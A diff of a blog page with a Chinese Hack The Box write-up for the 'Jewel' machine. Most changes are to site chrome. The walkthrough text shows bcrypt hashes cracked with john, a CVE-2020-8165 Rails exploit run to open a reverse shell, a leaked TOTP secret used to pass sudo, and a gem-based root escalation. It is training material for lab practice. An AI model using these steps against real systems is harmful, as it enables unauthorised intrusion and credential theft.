@@ -121,8 +121,15 @@
             </li>
         
             <li class="waves-block waves-effect">
+              <a href="https://www.buymeacoffee.com/darkwing_nya" target="_blank" >
+                <i class="icon icon-lg icon-coffee"></i>
+                Buy me a coffe
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link"></i>
+                <i class="icon icon-lg icon-link2"></i>
                 About
               </a>
             </li>
@@ -144,7 +151,7 @@
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                 <i class="icon icon-lg icon-chevron-left"></i>
             </a>
-            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                 <i class="icon icon-lg icon-search"></i>
             </a>
@@ -218,42 +225,14 @@
 
 
 <h2 id="8000"><a href="#8000" class="headerlink" title="8000"></a>8000</h2><p>8000是gitweb：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020102701.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020102701.jpg" alt=""></p>
 <h2 id="8080"><a href="#8080" class="headerlink" title="8080"></a>8080</h2><p>8080是一个blog：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020102702.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020102702.jpg" alt=""></p>
 <h1 id="gitweb"><a href="#gitweb" class="headerlink" title="gitweb"></a>gitweb</h1><p>8000的gitweb简单浏览能发现一些文件，其中有一个bd.sql是sql备份文件：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020102703.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020102703.jpg" alt=""></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.10.10.211:8000&#x2F;gitweb&#x2F;?p&#x3D;.git;a&#x3D;blob;f&#x3D;bd.sql;h&#x3D;a7fddb693ca735f8aa1e4b09046cec2adddddc51;hb&#x3D;HEAD</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020102704.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020102704.jpg" alt=""></p>
 <h2 id="bd-sql"><a href="#bd-sql" class="headerlink" title="bd.sql"></a>bd.sql</h2><p>在sql文件中得到用户信息：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">COPY public.users (id, username, email, created_at, updated_at, password_digest) FROM stdin;</span><br><span class="line">1	bill	bill@mail.htb	2020-08-25 08:13:58.662464	2020-08-25 08:13:58.662464	$2a$12$uhUssB8.HFpT4XpbhclQU.Oizufehl9qqKtmdxTXetojn2FcNncJW</span><br><span class="line">2	jennifer	jennifer@mail.htb	2020-08-25 08:54:42.8483	2020-08-25 08:54:42.8483	$2a$12$ik.0o.TGRwMgUmyOR.Djzuyb&#x2F;hjisgk2vws1xYC&#x2F;hxw8M1nFk0MQy</span><br><span class="line">\.</span><br></pre></td></tr></table></figure>
 
@@ -261,25 +240,11 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">➜  Jewel cat hashes.txt</span><br><span class="line"><span class="meta">$</span><span class="bash">2a<span class="variable">$12</span><span class="variable">$uhUssB8</span>.HFpT4XpbhclQU.Oizufehl9qqKtmdxTXetojn2FcNncJW</span></span><br><span class="line"><span class="meta">$</span><span class="bash">2a<span class="variable">$12</span><span class="variable">$ik</span>.0o.TGRwMgUmyOR.Djzuyb/hjisgk2vws1xYC/hxw8M1nFk0MQy</span></span><br><span class="line"></span><br><span class="line">➜  Jewel sudo john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt</span><br><span class="line">[sudo] password for miao:</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3])</span><br><span class="line">Cost 1 (iteration count) is 4096 for all loaded hashes</span><br><span class="line">Will run 2 OpenMP threads</span><br><span class="line">Press 'q' or Ctrl-C to abort, almost any other key for status</span><br></pre></td></tr></table></figure>
 
 <h1 id="BL0G"><a href="#BL0G" class="headerlink" title="BL0G"></a>BL0G</h1><p> 转到8080 blog，随意注册一个账号登录：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020102705.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020102705.jpg" alt=""></p>
 <h2 id="rails"><a href="#rails" class="headerlink" title="rails"></a>rails</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.10.10.211:8000&#x2F;gitweb&#x2F;?p&#x3D;.git;a&#x3D;commitdiff;h&#x3D;5d6f436256c9575fbc7b1fb9621b18f0f8656741</span><br></pre></td></tr></table></figure>
 
 <p>根据8000端口gitweb上面的信息，这个blog应该是基于ruby rails，并且rails版本是5.2.2.1：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020102706.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020102706.jpg" alt=""></p>
 <p>搜索得到CVE-2020-8165：</p>
 <ul>
 <li>[CVE-2020-8165] Potentially unintended unmarshalling of user-provided objects in MemCacheStore and RedisCacheStore<br><a href="https://groups.google.com/g/ruby-security-ann/c/OEWeyjD7NHY" target="_blank" rel="noopener">https://groups.google.com/g/ruby-security-ann/c/OEWeyjD7NHY</a></li>
@@ -291,14 +256,7 @@
 <h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>打到bill用户的shell，在用户目录得到userx.txt：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 CVE-2020-8165.py 10.10.10.211 10.10.14.7 4445</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020102707.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020102707.jpg" alt=""></p>
 <h1 id="提权信息"><a href="#提权信息" class="headerlink" title="提权信息"></a>提权信息</h1><h2 id="home-bill-blog-bd-sql"><a href="#home-bill-blog-bd-sql" class="headerlink" title="/home/bill/blog/bd.sql"></a>/home/bill/blog/bd.sql</h2><p>Blog目录也有个bd.sql:</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">COPY public.users (id, username, email, created_at, updated_at, password_digest) FROM stdin;</span><br><span class="line">1	bill	bill@mail.htb	2020-08-25 08:13:58.662464	2020-08-25 08:13:58.662464	$2a$12$uhUssB8.HFpT4XpbhclQU.Oizufehl9qqKtmdxTXetojn2FcNncJW</span><br><span class="line">2	jennifer	jennifer@mail.htb	2020-08-25 08:54:42.8483	2020-08-25 08:54:42.8483	$2a$12$ik.0o.TGRwMgUmyOR.Djzuyb/hjisgk2vws1xYC/hxw8M1nFk0MQy</span><br><span class="line">\.</span><br></pre></td></tr></table></figure>
 
@@ -309,48 +267,20 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">➜  Jewel cat hashes.txt</span><br><span class="line"><span class="meta">$</span><span class="bash">2a<span class="variable">$12</span><span class="variable">$uhUssB8</span>.HFpT4XpbhclQU.Oizufehl9qqKtmdxTXetojn2FcNncJW</span></span><br><span class="line"><span class="meta">$</span><span class="bash">2a<span class="variable">$12</span><span class="variable">$ik</span>.0o.TGRwMgUmyOR.Djzuyb/hjisgk2vws1xYC/hxw8M1nFk0MQy</span></span><br><span class="line"><span class="meta">$</span><span class="bash">2a<span class="variable">$12</span><span class="variable">$sZac9R2VSQYjOcBTTUYy6</span>.Zd.5I02OnmkKnD3zA6MqMrzLKz0jeDO</span></span><br><span class="line"><span class="meta">$</span><span class="bash">2a<span class="variable">$12</span><span class="variable">$QqfetsTSBVxMXpnTR</span>.JfUeJXcJRHv5D5HImL0EHI7OzVomCrqlRxW</span></span><br><span class="line">➜  Jewel sudo john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt</span><br><span class="line">[sudo] password for miao:</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 4 password hashes with 4 different salts (bcrypt [Blowfish 32/64 X3])</span><br><span class="line">Cost 1 (iteration count) is 4096 for all loaded hashes</span><br><span class="line">Will run 2 OpenMP threads</span><br><span class="line">Press 'q' or Ctrl-C to abort, almost any other key for status</span><br><span class="line">spongebob        (?)</span><br></pre></td></tr></table></figure>
 
 <p> 这个密码是bill用户的，但尝试sudo -l后还需要一个验证码：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020102708.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020102708.jpg" alt=""></p>
 <h2 id="google-authenticator"><a href="#google-authenticator" class="headerlink" title=".google_authenticator"></a>.google_authenticator</h2><p>在bill用户目录发现隐藏文件.google_authenticator：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bill@jewel:~$ cat .google_authenticator</span><br><span class="line">cat .google_authenticator</span><br><span class="line">2UQI3R52WFCLE6JTLDCSJYMJH4</span><br><span class="line">" WINDOW_SIZE 17</span><br><span class="line">" TOTP_AUTH</span><br><span class="line">bill@jewel:~$</span><br></pre></td></tr></table></figure>
 
 <p>得到OTP生成的secret，然后随便找个生成工具就可以生成OTP：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020102709.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020102709.jpg" alt=""></p>
 <h2 id="sudo-l"><a href="#sudo-l" class="headerlink" title="sudo -l"></a>sudo -l</h2><p>sudo -l显示可以可以使用gem:</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020102710.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020102710.jpg" alt=""></p>
 <p>利用方式：</p>
 <ul>
 <li>gem | GTFOBins<br><a href="https://gtfobins.github.io/gtfobins/gem/" target="_blank" rel="noopener">https://gtfobins.github.io/gtfobins/gem/</a></li>
 </ul>
 <h1 id="提权-amp-root-flag"><a href="#提权-amp-root-flag" class="headerlink" title="提权 &amp; root flag"></a>提权 &amp; root flag</h1><p> 然后就是一键root，得到root.txt：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020102711.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020102711.jpg" alt=""></p>
 <h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
 <li>[CVE-2020-8165] Potentially unintended unmarshalling of user-provided objects in MemCacheStore and RedisCacheStore<br><a href="https://groups.google.com/g/ruby-security-ann/c/OEWeyjD7NHY" target="_blank" rel="noopener">https://groups.google.com/g/ruby-security-ann/c/OEWeyjD7NHY</a></li>
 <li>masahiro331/CVE-2020-8165<br><a href="https://github.com/masahiro331/CVE-2020-8165" target="_blank" rel="noopener">https://github.com/masahiro331/CVE-2020-8165</a></li>
@@ -366,7 +296,7 @@
     <div class="content">
         
 <span class="post-time">
-    最后更新时间：<time datetime="2021-02-18T00:44:31.856Z" itemprop="dateUpdated">2021-02-18 08:44:31</time>
+    Last updated: <time datetime="2021-02-18T00:44:31.856Z" itemprop="dateUpdated">2021-02-18 08:44:31</time>
 </span><br>
 
 
@@ -533,11 +463,11 @@
             
                 <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
             
-            <span>博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+            <span>This blog is licensed under a <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/" target="_blank">Creative Commons Attribution 4.0 International License</a>.</span>
         </p>
     </div>
     <div class="bottom">
-        <p><span>暗羽 &copy; 2014 - 2023</span>
+        <p><span>暗羽 &copy; 2014 - 2024</span>
             <span>
                 
                 Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
